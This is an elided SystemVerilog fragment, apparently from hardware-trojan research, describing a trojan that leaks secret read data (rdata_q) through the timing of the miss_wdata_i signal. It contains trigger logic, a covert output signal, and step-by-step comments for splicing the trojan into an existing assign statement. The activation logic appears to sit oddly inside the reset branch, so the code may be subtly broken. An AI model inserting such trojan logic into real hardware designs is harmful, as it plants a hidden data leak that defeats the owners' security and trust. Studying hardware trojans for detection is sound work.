 ...
 * Payload: Modulate miss_wdata_i timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |miss_wdata_i) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of miss_wdata_i:
...
logic       covert_bit_out;         // Drives miss_wdata_i when trojan active
...
//   Find the assign for miss_wdata_i (or rd_error_o as fallback):
//     assign miss_wdata_i = <normal_expr>;
//   Replace with:
//     assign miss_wdata_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
